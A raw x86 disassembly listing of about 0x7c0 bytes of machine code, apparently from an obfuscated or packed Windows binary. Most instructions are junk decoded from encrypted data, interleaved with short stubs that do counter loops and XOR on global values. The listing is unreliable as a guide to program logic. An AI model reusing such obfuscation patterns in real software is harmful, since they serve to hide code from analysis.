  40da0a:	neg    BYTE PTR [ebp-0x1130be6d]
  40da10:	mov    al,ds:0x207a2da8
  40da15:	mov    cl,0x31
  40da17:	cmp    BYTE PTR ds:0x292d158e,0x70
  40da1e:	cli    
  40da1f:	in     al,dx
  40da20:	idiv   BYTE PTR [edi-0x4d]
  40da23:	call   0x6c7b:0x82e0de99
  40da2a:	pop    esi
  40da2b:	sar    BYTE PTR [ebx-0x1a],0xfb
  40da2f:	into   
  40da30:	xchg   ebx,eax
  40da31:	jb     0x40da5a
  40da33:	inc    esi
  40da34:	mov    BYTE PTR [esp+esi*1+0x14],ah
  40da38:	enter  0xc205,0xb3
  40da3c:	retf   
  40da3d:	cmp    eax,DWORD PTR [ebx+0x7b5f84ce]
  40da43:	outs   dx,DWORD PTR cs:[esi]
  40da45:	mov    esp,0x2209ae35
  40da4a:	retf   
  40da4b:	test   DWORD PTR [eax+edi*1],0x8b014aae
  40da52:	cs in  al,0x0
  40da55:	push   ds
  40da56:	add    al,0x87
  40da58:	daa    
  40da59:	fidivr DWORD PTR [edx-0x4d]
  40da5c:	sub    eax,0xcf019c31
  40da61:	loope  0x40da9e
  40da63:	jnp    0x40da60
  40da65:	test   ecx,eax
  40da67:	inc    esi
  40da68:	pushf  
  40da69:	adc    ebx,DWORD PTR [edx-0x47]
  40da6c:	scas   al,BYTE PTR es:[edi]
  40da6d:	sahf   
  40da6e:	adc    ch,BYTE PTR [edx+ebx*8]
  40da71:	pop    esp
  40da72:	jp     0x40da75
  40da74:	add    bh,0x8d
  40da77:	inc    edx
  40da78:	push   esp
  40da79:	jl     0x40da73
  40da7b:	inc    esp
  40da7c:	je     0x40daf8
  40da7e:	int3   
  40da7f:	mov    BYTE PTR [bp+di],al
  40da82:	shr    BYTE PTR [eax-0x4b741de8],1
  40da88:	inc    ecx
  40da89:	sti    
  40da8a:	fsubr  st,st(6)
  40da8c:	mov    ds:0xec7e7926,al
  40da91:	pop    edx
  40da92:	shl    BYTE PTR [eax+0x20],0xdf
  40da96:	rol    dl,1
  40da98:	int    0x90
  40da9a:	and    esp,DWORD PTR [ebx+0x62]
  40da9d:	sub    dh,ah
  40da9f:	outs   dx,DWORD PTR ds:[esi]
  40daa0:	xor    al,ch
  40daa2:	dec    edx
  40daa3:	test   BYTE PTR [edi-0x73],ch
  40daa6:	and    DWORD PTR ds:0x69323fa,esp
  40daac:	aad    0xae
  40daae:	repnz xchg edx,eax
  40dab0:	ret    
  40dab1:	in     eax,0x2e
  40dab3:	call   0x24ee:0x4c6d53e7
  40daba:	pop    edx
  40dabb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dabc:	xchg   ebp,eax
  40dabd:	cmp    al,0x6f
  40dabf:	cmp    bh,BYTE PTR [edi+0x1d]
  40dac2:	add    eax,0x2d84636a
  40dac7:	sbb    eax,0x3b46e20a
  40dacc:	adc    DWORD PTR [eax],eax
  40dace:	sti    
  40dacf:	mov    eax,0xe5ecb72f
  40dad4:	or     DWORD PTR [esi+0x7b],ecx
  40dad7:	lahf   
  40dad8:	iret   
  40dad9:	cs repnz cmp al,0x63
  40dadd:	dec    esp
  40dade:	bound  edi,QWORD PTR [eax]
  40dae0:	clc    
  40dae1:	jo     0x40db51
  40dae3:	sbb    eax,0xdda2dcfb
  40dae8:	xchg   ecx,eax
  40dae9:	clc    
  40daea:	inc    ecx
  40daeb:	add    al,0x94
  40daed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daee:	xor    cl,ch
  40daf0:	pusha  
  40daf1:	pop    ebp
  40daf2:	cmp    BYTE PTR [edx-0x5080bdfe],bh
  40daf8:	das    
  40daf9:	sbb    BYTE PTR [ecx-0x639f1153],0xf3
  40db00:	or     al,0x78
  40db02:	mov    eax,0x49a40afa
  40db07:	pop    esp
  40db08:	xchg   DWORD PTR [esi-0x419d1978],edi
  40db0e:	scas   al,BYTE PTR es:[edi]
  40db0f:	or     al,0xdc
  40db11:	pusha  
  40db12:	repnz cmp bh,ah
  40db15:	cmp    ebx,DWORD PTR [esp+eiz*8+0x5c752c13]
  40db1c:	pop    ebx
  40db1d:	xchg   esp,eax
  40db1e:	xor    DWORD PTR [eax+0x1b],esp
  40db21:	(bad)  
  40db22:	pop    ebp
  40db23:	imul   edx,DWORD PTR [edx-0x1],0x16d84dad
  40db2a:	adc    dl,cl
  40db2c:	xchg   ebp,eax
  40db2d:	sub    bh,BYTE PTR [edx+ebx*1-0xb]
  40db31:	test   eax,0xd127fb11
  40db36:	jo     0x40db8c
  40db38:	jbe    0x40daba
  40db3a:	sar    BYTE PTR [edx+0x7b],1
  40db3d:	jle    0x40dae9
  40db3f:	pushf  
  40db40:	or     eax,0xe9c327cb
  40db45:	addr16 retf 
  40db47:	sbb    ah,ah
  40db49:	fwait
  40db4a:	sbb    BYTE PTR [ecx-0x16],dl
  40db4d:	jmp    0x40dbaa
  40db4f:	in     eax,dx
  40db50:	adc    DWORD PTR [ebx],edx
  40db52:	or     al,0x3d
  40db54:	lds    esi,FWORD PTR ds:0x167d9f7f
  40db5a:	and    al,0xca
  40db5c:	leave  
  40db5d:	call   0x173148e7
  40db62:	dec    eax
  40db63:	call   0xa2d1:0x16e41213
  40db6a:	scas   al,BYTE PTR es:[edi]
  40db6b:	(bad)  
  40db6c:	jmp    0x40dbcb
  40db6e:	lods   al,BYTE PTR ds:[esi]
  40db6f:	popf   
  40db70:	xchg   edi,ebx
  40db72:	shl    BYTE PTR [esi-0x4e],0xbb
  40db76:	stos   DWORD PTR es:[edi],eax
  40db77:	daa    
  40db78:	daa    
  40db79:	scas   al,BYTE PTR es:[edi]
  40db7a:	jae    0x40db92
  40db7c:	mov    ebx,ebx
  40db7e:	loopne 0x40db89
  40db80:	fdivr  DWORD PTR [esi+0x12]
  40db83:	enter  0xccd6,0x32
  40db87:	imul   edx,DWORD PTR [edi-0x4eec72ca],0x6b
  40db8e:	fs or  bl,ch
  40db91:	push   esi
  40db92:	mov    WORD PTR [ebx+0xa],ds
  40db95:	scas   eax,DWORD PTR es:[edi]
  40db96:	mov    esi,DWORD PTR [ecx+eax*2-0x43]
  40db9a:	or     BYTE PTR [edx-0x9],dh
  40db9d:	repz hlt 
  40db9f:	add    cl,BYTE PTR [esi]
  40dba1:	mov    edx,0xfeae60f3
  40dba6:	sub    eax,ebx
  40dba8:	add    DWORD PTR [ebp+0x47],edi
  40dbab:	imul   ebp,DWORD PTR [edx-0x529558e7],0xbf168d82
  40dbb5:	cmp    eax,ecx
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x79bfeba4],0xfa0594ae
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40db7b
  40dbe0:	lahf   
  40dbe1:	jo     0x40dc4f
  40dbe3:	ss mov al,0x9
  40dbe6:	push   ss
  40dbe7:	sbb    BYTE PTR [esi-0x6a12168b],0xd4
  40dbee:	shl    BYTE PTR [ecx-0x6c],0x8a
  40dbf2:	cmp    BYTE PTR [eax+ecx*8],bl
  40dbf5:	adc    BYTE PTR [edi],0xfe
  40dbf8:	lods   al,BYTE PTR ds:[esi]
  40dbf9:	(bad)  
  40dbfb:	fdiv   QWORD PTR [edi+0x47b15304]
  40dc01:	or     DWORD PTR [esi+eiz*4],ebp
  40dc04:	jle    0x40dbe0
  40dc06:	or     eax,0x31c7356a
  40dc0b:	inc    edi
  40dc0c:	fcomip st,st(2)
  40dc0e:	inc    esp
  40dc0f:	aaa    
  40dc10:	cmp    dh,BYTE PTR [ecx+0x6e]
  40dc13:	or     eax,DWORD PTR [esi-0x1da725a4]
  40dc19:	ins    DWORD PTR es:[edi],dx
  40dc1a:	inc    ecx
  40dc1b:	aaa    
  40dc1c:	call   0xab35:0xd70ee712
  40dc23:	xlat   BYTE PTR ds:[bx]
  40dc25:	or     ah,dl
  40dc27:	push   ebx
  40dc28:	stos   BYTE PTR es:[edi],al
  40dc29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc2a:	lods   al,BYTE PTR ds:[esi]
  40dc2b:	call   0x24a8:0xfca4c982
  40dc32:	jecxz  0x40dbff
  40dc34:	loop   0x40dc9e
  40dc36:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc38:	xchg   esi,eax
  40dc39:	mov    edi,0x80e0d7fe
  40dc3e:	aam    0xd3
  40dc40:	retf   
  40dc41:	inc    esi
  40dc43:	inc    esp
  40dc45:	inc    edx
  40dc46:	jmp    0x2d5d30c9
  40dc4b:	pop    esi
  40dc4c:	outs   dx,BYTE PTR ds:[esi]
  40dc4d:	mov    eax,0x6c8b61c2
  40dc52:	pop    esi
  40dc53:	out    0x1d,al
  40dc55:	or     DWORD PTR [esi+0x51],ecx
  40dc58:	push   0x25
  40dc5a:	mov    edx,0xfeae8908
  40dc5f:	fcomi  st,st(5)
  40dc61:	int    0xad
  40dc63:	lds    eax,FWORD PTR [esi+ebp*8-0x71]
  40dc67:	pusha  
  40dc68:	pop    eax
  40dc69:	in     eax,0x9d
  40dc6b:	mov    dl,0xa8
  40dc6d:	xchg   edi,eax
  40dc6e:	cmp    esi,edx
  40dc70:	bound  ecx,QWORD PTR [ebp-0x59]
  40dc73:	dec    edx
  40dc74:	jmp    0x2c3bface
  40dc79:	mov    al,ds:0x985099dd
  40dc7e:	mov    dh,0xc2
  40dc80:	jno    0x40dc7e
  40dc82:	call   0xbcc05478
  40dc87:	pop    eax
  40dc88:	shl    DWORD PTR [edx-0x59],cl
  40dc8b:	ins    BYTE PTR es:[edi],dx
  40dc8c:	sbb    eax,0x8fc37027
  40dc91:	cwde   
  40dc92:	and    eax,0x6e67bdd8
  40dc97:	jle    0x40dcba
  40dc99:	into   
  40dc9a:	lock ret 
  40dc9c:	in     eax,dx
  40dc9d:	inc    esi
  40dc9e:	out    dx,eax
  40dc9f:	inc    ebx
  40dca0:	xchg   esp,eax
  40dca1:	xchg   ebp,eax
  40dca2:	cmp    eax,0x957c776d
  40dca7:	mov    al,0xe5
  40dca9:	push   0xffffffc6
  40dcab:	jg     0x40dcdd
  40dcad:	add    ecx,DWORD PTR [eax+0x72b2d380]
  40dcb3:	jp     0x40dc65
  40dcb5:	inc    esp
  40dcb6:	(bad)  
  40dcb8:	jmp    0x40dc3b
  40dcba:	test   BYTE PTR [edi],dh
  40dcbc:	iret   
  40dcbd:	adc    bh,BYTE PTR [edx-0x2e69aed5]
  40dcc3:	add    BYTE PTR [ebx+0x73],ch
  40dcc6:	jmp    0x40dce4
  40dcc8:	scas   eax,DWORD PTR es:[edi]
  40dcc9:	dec    edi
  40dcca:	mov    ds:0xae3c45da,al
  40dccf:	xchg   edx,eax
  40dcd0:	ficom  DWORD PTR [edx+0x164d4503]
  40dcd6:	rol    esp,cl
  40dcd8:	enter  0xc42,0x60
  40dcdc:	pop    edx
  40dcdd:	push   0x24
  40dcdf:	inc    edx
  40dce0:	mov    bl,0xc4
  40dce2:	sub    bl,BYTE PTR [ebx+0x20]
  40dce5:	retf   0xbd6c
  40dce8:	mov    edx,0x82924f35
  40dced:	dec    esp
  40dcee:	sbb    eax,0x9099cee4
  40dcf3:	push   0x15da382c
  40dcf8:	arpl   ax,bp
  40dcfa:	jp     0x40dd10
  40dcfc:	dec    esi
  40dcfd:	jg     0x40dd51
  40dcff:	push   esi
  40dd00:	stc    
  40dd01:	arpl   WORD PTR [ecx+eiz*1],bp
  40dd04:	jmp    DWORD PTR [ecx+0x46]
  40dd07:	cmp    al,BYTE PTR [ebx]
  40dd09:	rol    DWORD PTR [eax+ebp*1+0x6d49fa61],1
  40dd10:	inc    esi
  40dd11:	test   eax,0xcbdd7263
  40dd16:	fwait
  40dd17:	pop    esp
  40dd18:	and    ah,cl
  40dd1a:	sbb    al,0xd5
  40dd1c:	aas    
  40dd1d:	pop    eax
  40dd1e:	push   ss
  40dd1f:	int3   
  40dd20:	outs   dx,DWORD PTR ds:[esi]
  40dd21:	xchg   ebp,eax
  40dd22:	mov    esp,0x9809da4d
  40dd27:	add    ebx,DWORD PTR [edx-0x50]
  40dd2a:	outs   dx,BYTE PTR ds:[esi]
  40dd2b:	int    0xe7
  40dd2d:	add    DWORD PTR [ebp+0x7001d54],ebp
  40dd33:	dec    esp
  40dd34:	pop    cx
  40dd36:	xor    esi,DWORD PTR [ebx+0x76]
  40dd39:	std    
  40dd3a:	xor    BYTE PTR [ecx+0x521f764],0xcd
  40dd41:	jnp    0x40dd21
  40dd43:	or     al,0x4
  40dd45:	fiadd  WORD PTR [edi]
  40dd47:	into   
  40dd48:	dec    edx
  40dd49:	scas   al,BYTE PTR es:[edi]
  40dd4a:	cmp    ecx,DWORD PTR [ecx-0x510b9ac7]
  40dd50:	push   ss
  40dd51:	mov    ch,BYTE PTR [ecx+0x7bd2f133]
  40dd57:	addr16 jnp 0x40dd9c
  40dd5a:	in     al,dx
  40dd5b:	into   
  40dd5c:	dec    ebx
  40dd5d:	or     al,0xb1
  40dd5f:	cmp    DWORD PTR [edi+0x34dad036],esp
  40dd65:	mov    edx,0x35ab9b36
  40dd6a:	push   edx
  40dd6b:	das    
  40dd6c:	test   al,0xbb
  40dd6e:	lock jmp 0x40ddd7
  40dd71:	pop    ss
  40dd72:	xor    al,BYTE PTR [eax+0x2dfedfe5]
  40dd78:	xor    eax,0x9e45cde2
  40dd7d:	mov    edi,0xb0c7e7fb
  40dd82:	out    0x70,eax
  40dd84:	(bad)  [eax-0x553c7aa2]
  40dd8a:	jne    0x40dd98
  40dd8c:	jo     0x40dd11
  40dd8e:	and    DWORD PTR [edi-0x5cd963ba],ebp
  40dd94:	ins    BYTE PTR es:[edi],dx
  40dd95:	mov    ah,0x92
  40dd97:	sbb    DWORD PTR [edx],0xb051618a
  40dd9d:	and    DWORD PTR [eax+0x5b],ebx
  40dda0:	push   cs
  40dda1:	sbb    DWORD PTR [eax-0x2a],ebx
  40dda4:	push   es
  40dda5:	inc    edx
  40dda6:	push   0x4169d0f1
  40ddab:	xchg   esp,eax
  40ddac:	bound  ebx,QWORD PTR [ecx-0x56]
  40ddaf:	mov    ecx,0x87d327c5
  40ddb4:	sbb    ebx,DWORD PTR [ecx+0x2047228f]
  40ddba:	or     edx,ebx
  40ddbc:	imul   eax,DWORD PTR [ebx+0x4e],0x21
  40ddc0:	push   edi
  40ddc1:	int3   
  40ddc2:	mov    dh,0xbf
  40ddc4:	adc    ebp,0xfffffffd
  40ddc7:	mov    ebp,0xf7004d00
  40ddcc:	push   eax
  40ddcd:	lods   eax,DWORD PTR ds:[esi]
  40ddce:	mov    eax,0xcecd921f
  40ddd3:	test   BYTE PTR [edi],ch
  40ddd5:	mov    dh,0x3c
  40ddd7:	sbb    edx,ebx
  40ddd9:	sub    ebp,DWORD PTR [edx-0x15]
  40dddc:	call   0x770302e9
  40dde1:	lea    esp,[eax+eiz*2-0x73]
  40dde5:	or     eax,0xb2d6aafd
  40ddea:	imul   BYTE PTR [ebx-0x2e]
  40dded:	je     0x40de30
  40ddef:	retf   
  40ddf0:	rcl    DWORD PTR [edx-0x11],1
  40ddf3:	sti    
  40ddf4:	cs sbb eax,0xe26198cc
  40ddfa:	add    edx,DWORD PTR [ecx]
  40ddfc:	adc    ah,ah
  40ddfe:	inc    esp
  40ddff:	in     al,0x4f
  40de01:	fistp  QWORD PTR [esi-0x2fff3102]
  40de07:	pop    ebx
  40de08:	bound  esi,QWORD PTR [edx+0x13]
  40de0b:	or     ah,cl
  40de0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de0e:	rcl    BYTE PTR [ebx+0x3a5cfa36],0xcb
  40de15:	sti    
  40de16:	and    edi,DWORD PTR ds:0x862dd33c
  40de1c:	jmp    0xc6441ce7
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43381f,0x0
  40de5a:	mov    eax,ds:0x43381f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43381f,eax
  40de65:	cmp    DWORD PTR ds:0x43381f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43381f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x43386f,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	test   ebp,0xbabace36
  40deab:	pushf  
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40dea7
  40deb3:	cdq    
  40deb4:	xor    eax,0xc75872ea
  40deb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40deba:	ins    BYTE PTR es:[edi],dx
  40debb:	push   cs
  40debc:	mov    ch,0x33
  40debe:	in     al,dx
  40debf:	lea    esp,[edi+edx*4+0x27]
  40dec3:	ficom  DWORD PTR [eax+0x239f32b1]
  40dec9:	stos   DWORD PTR es:[edi],eax
  40deca:	jno    0x40de86
  40decc:	aaa    
  40decd:	mov    ch,0x76
  40decf:	(bad)  
  40ded0:	repz pop ss
  40ded2:	in     al,dx
  40ded3:	push   eax
  40ded4:	sbb    DWORD PTR [ecx+edi*2-0x624ef1b3],eax
  40dedb:	cmp    dl,ch
  40dedd:	sub    bh,BYTE PTR [eax]
  40dedf:	(bad)  
  40dee0:	(bad)  
  40dee1:	ds test eax,0xc8732d09
  40dee7:	and    BYTE PTR [eax+edx*4+0xc],bh
  40deeb:	xor    dh,bl
  40deed:	or     esi,edx
  40deef:	xchg   edi,ecx
  40def1:	std    
  40def2:	lods   al,BYTE PTR ds:[esi]
  40def3:	shl    BYTE PTR [esi+0x33cc1f93],0xff
  40defa:	jnp    0x40df3e
  40defc:	xchg   BYTE PTR [eax-0x1f7482cd],al
  40df02:	leave  
  40df03:	sub    dl,cl
  40df05:	mov    ds:0xb2ef9dad,eax
  40df0a:	scas   al,BYTE PTR es:[edi]
  40df0b:	rol    DWORD PTR [ebp+0x0],0xc4
  40df0f:	inc    ebx
  40df10:	xor    al,0x61
  40df12:	shl    ebx,0x8a
  40df15:	sub    edx,ebx
  40df17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df18:	inc    ecx
  40df19:	cmc    
  40df1a:	mov    DWORD PTR [ebx+0xd],esi
  40df1d:	shl    DWORD PTR [eax+eiz*2],cl
  40df20:	sub    esp,DWORD PTR [eax]
  40df22:	push   cs
  40df23:	gs iret 
  40df25:	mov    ecx,0xc40a2781
  40df2a:	dec    ebp
  40df2b:	int    0xb9
  40df2d:	std    
  40df2e:	stc    
  40df2f:	xor    edx,DWORD PTR [edx+0x7c]
  40df32:	cmp    al,0x5c
  40df34:	gs pop eax
  40df36:	idiv   ah
  40df38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df39:	mov    ah,0x99
  40df3b:	or     ecx,edi
  40df3d:	cmp    eax,0x9487ed96
  40df42:	bound  ebx,QWORD PTR [ebx+0x78]
  40df45:	inc    edi
  40df46:	rcl    DWORD PTR [eax],0xf2
  40df49:	jmp    FWORD PTR [edi]
  40df4b:	sbb    DWORD PTR [esi+ecx*2-0x69f9000b],ebp
  40df52:	mov    al,cl
  40df54:	stos   BYTE PTR es:[edi],al
  40df55:	push   edx
  40df56:	(bad)  
  40df58:	in     eax,0x73
  40df5a:	and    al,0xe5
  40df5c:	icebp  
  40df5d:	and    al,0xd0
  40df5f:	inc    eax
  40df60:	add    DWORD PTR [ebp-0x7b6a1995],edx
  40df66:	in     eax,0xbb
  40df68:	add    ch,0xbf
  40df6b:	dec    eax
  40df6c:	xchg   edx,eax
  40df6d:	jbe    0x40dfd9
  40df6f:	xchg   esp,eax
  40df70:	sbb    esp,esi
  40df72:	cld    
  40df73:	retf   0xa844
  40df76:	cwde   
  40df77:	gs out dx,eax
  40df79:	or     ebx,ecx
  40df7b:	loop   0x40df49
  40df7d:	scas   al,BYTE PTR es:[edi]
  40df7e:	pop    ecx
  40df7f:	mov    al,0xf1
  40df81:	pop    eax
  40df82:	mov    ebx,0xaf183fee
  40df87:	push   es
  40df88:	fwait
  40df89:	push   ds
  40df8a:	xor    bl,BYTE PTR [ebp+0x6e]
  40df8d:	jle    0xf1f73184
  40df93:	cmp    dl,BYTE PTR [eax]
  40df95:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40df97:	enter  0xb7ba,0x80
  40df9b:	pminsw mm5,QWORD PTR [edi-0x27]
  40df9f:	fisubr DWORD PTR [edi]
  40dfa1:	in     eax,dx
  40dfa2:	sbb    al,0xe8
  40dfa4:	mov    ch,0x43
  40dfa6:	jmp    0x9dd34faf
  40dfab:	dec    edx
  40dfac:	sub    eax,0x63b0b699
  40dfb1:	cwde   
  40dfb2:	scas   al,BYTE PTR es:[edi]
  40dfb3:	mov    al,ds:0x6e2bd55b
  40dfb8:	sub    al,0xcd
  40dfbb:	sub    esp,DWORD PTR [edi+0x3d]
  40dfbe:	inc    ebp
  40dfbf:	mov    dh,0x30
  40dfc1:	aas    
  40dfc2:	bound  ebx,QWORD PTR [edi+0x26]
  40dfc5:	pop    esi
  40dfc6:	xchg   edi,eax
  40dfc7:	mov    ebp,ecx
  40dfc9:	cmc    
  40dfca:	addr16 sub al,0x17
  40dfcd:	into   
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433817,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x43386b,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	repnz adc ebp,DWORD PTR [ebp+0xd]
  40e007:	pop    esi
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e04c
  40e010:	xlat   BYTE PTR ds:[ebx]
  40e011:	call   0x4a8b8d9d
  40e016:	retf   
  40e017:	fisttp WORD PTR [eax+ebp*8-0x4a02bc06]
  40e01e:	sub    BYTE PTR [edi+0x6a02f64b],dh
  40e024:	div    DWORD PTR [ecx-0x58]
  40e027:	in     al,dx
  40e028:	daa    
  40e029:	push   es
  40e02a:	and    DWORD PTR [eax+0x22ab68ec],edi
  40e030:	and    esi,DWORD PTR [edx+0x5]
  40e033:	out    dx,al
  40e034:	or     BYTE PTR [esi+0x42680eeb],al
  40e03a:	adc    bl,BYTE PTR [edx-0x41e8374]
  40e040:	shl    BYTE PTR [esi+esi*4+0x53c8050e],cl
  40e047:	frstor [esi-0x3d]
  40e04a:	test   DWORD PTR [esi],edx
  40e04c:	es pop edi
  40e04e:	mov    cs,WORD PTR [edi]
  40e050:	(bad)  
  40e051:	inc    ch
  40e053:	ficom  DWORD PTR ds:0xa891c5e2
  40e059:	xchg   esi,eax
  40e05a:	imul   ecx,DWORD PTR [edx-0x453a87a8],0x6cc01fd1
  40e064:	mov    esp,0x3a034f01
  40e069:	out    dx,eax
  40e06a:	(bad)  
  40e06c:	(bad)  
  40e06d:	out    0xc,al
  40e06f:	test   eax,0xf70a4618
  40e074:	fnop   
  40e076:	mov    cl,0x47
  40e078:	(bad)  
  40e07a:	inc    eax
  40e07b:	fist   DWORD PTR [eax-0x23a82b9d]
  40e081:	mov    edi,0x47a5660f
  40e086:	cdq    
  40e087:	sbb    edx,esp
  40e089:	test   DWORD PTR [esi-0x63],ebx
  40e08c:	test   eax,0x53c94a3e
  40e091:	mov    DWORD PTR [ebx],esi
  40e093:	retf   0xb9dd
  40e096:	jp     0x40e06c
  40e098:	loop   0x40e01a
  40e09a:	or     BYTE PTR [ecx+0x3bbde96b],0x9f
  40e0a1:	or     cl,bl
  40e0a3:	or     ebp,DWORD PTR [ebp-0x5e]
  40e0a6:	leave  
  40e0a7:	shl    DWORD PTR [ecx+0xb],cl
  40e0aa:	rol    DWORD PTR [ebx],1
  40e0ac:	cmp    DWORD PTR [edx],esi
  40e0ae:	ror    eax,0xe0
  40e0b1:	mov    es,eax
  40e0b3:	imul   edx,esp,0xffffffb4
  40e0b6:	mov    eax,ds:0x61181052
  40e0bb:	and    dh,BYTE PTR [eax+0x6a5a6e5f]
  40e0c1:	push   cs
  40e0c2:	push   ds
  40e0c3:	test   DWORD PTR ds:0x63e9349e,edi
  40e0c9:	fnstcw WORD PTR [ecx-0x6ca1b0bd]
  40e0cf:	pop    ebx
  40e0d0:	or     esp,DWORD PTR ds:0x37feccc6
  40e0d6:	mov    ecx,ecx
  40e0d8:	inc    esp
  40e0d9:	into   
  40e0da:	push   edx
  40e0db:	test   BYTE PTR [esi],dh
  40e0dd:	sahf   
  40e0de:	adc    BYTE PTR [edx],dh
  40e0e0:	mov    esp,0xd7efcd8f
  40e0e5:	cwde   
  40e0e6:	scas   eax,DWORD PTR es:[edi]
  40e0e7:	push   edi
  40e0e8:	add    esi,edi
  40e0ea:	imul   edi,DWORD PTR [edx+0x5b],0xffffffa2
  40e0ee:	in     eax,0xc0
  40e0f0:	sbb    esi,ecx
  40e0f2:	hlt    
  40e0f3:	push   esi
  40e0f4:	push   edx
  40e0f5:	mov    ebx,0xce966a81
  40e0fa:	mov    ds,WORD PTR [ecx-0x1b]
  40e0fd:	and    esi,esi
  40e0ff:	mov    bl,0xfe
  40e101:	in     al,0x8e
  40e103:	xchg   esp,eax
  40e104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e105:	fwait
  40e106:	repz sbb eax,0x85e69bbb
  40e10c:	mov    ah,BYTE PTR [ebp-0x58]
  40e10f:	rcl    BYTE PTR [edx+0xe08030d],cl
  40e115:	inc    esp
  40e116:	lock inc ebp
  40e118:	adc    eax,eax
  40e11a:	div    BYTE PTR [ebx+0x9dcaf21]
  40e120:	mov    ch,0x91
  40e122:	xor    al,0x6a
  40e124:	sub    eax,0x6f4f265e
  40e129:	pop    edx
  40e12a:	xchg   DWORD PTR [ebx],esi
  40e12c:	mov    BYTE PTR [ecx+0x43382315],0x0
  40e133:	xchg   edi,eax
  40e134:	and    BYTE PTR [eax],al
  40e136:	add    BYTE PTR [ebx+0x32729b],bh
  40e13c:	xor    DWORD PTR ds:0x43386f,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	aad    0x7c
  40e15c:	dec    ecx
  40e15d:	dec    ebp
  40e15e:	jb     0x40e0fa
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e11f
  40e167:	pushf  
  40e168:	cmp    al,0x31
  40e16a:	dec    edi
  40e16b:	out    0xe4,eax
  40e16d:	or     BYTE PTR [eax-0x9],dl
  40e170:	jbe    0x40e14c
  40e172:	inc    ebp
  40e173:	stos   BYTE PTR es:[edi],al
  40e174:	xchg   ebp,eax
  40e175:	iret   
  40e176:	loope  0x40e11b
  40e178:	cwde   
  40e179:	pop    eax
  40e17a:	push   0xffffffcd
  40e17c:	add    DWORD PTR [edx-0xc289b79],esi
  40e182:	ret    0xfaf9
  40e185:	(bad)  
  40e186:	mov    BYTE PTR [edi],0xf1
  40e189:	sets   BYTE PTR [edx-0x1493fd1]
  40e190:	mov    ds:0xb746a56f,eax
  40e195:	loope  0x40e17a
  40e197:	mov    ebx,0x69e694d1
  40e19c:	add    DWORD PTR [ecx+eax*1],ecx
  40e19f:	pop    ebp
  40e1a0:	dec    eax
  40e1a1:	adc    al,0x47
  40e1a3:	xor    ah,bl
  40e1a5:	adc    ch,BYTE PTR [ebp+0x24dd5ad0]
  40e1ab:	mov    esi,0x3a5f79a1
  40e1b0:	aam    0x63
  40e1b2:	in     al,0x8b
  40e1b4:	and    DWORD PTR [esi+esi*8],0xb2462ac7
  40e1bb:	lock push ecx
  40e1bd:	lea    ebx,[edx]
  40e1bf:	mov    edi,edx
  40e1c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1c2:	jo     0x40e1ba
  40e1c4:	(bad)  
  40e1c5:	cmp    eax,0xadbf4dbc
  40e1ca:	push   edx
  40e1cb:	push   ebx
  40e1cc:	pushf  
  40e1cd:	adc    bh,BYTE PTR [ecx+eiz*2+0x2a]
  40e1d1:	mov    edx,0x44464c44
  40e1d6:	aas    
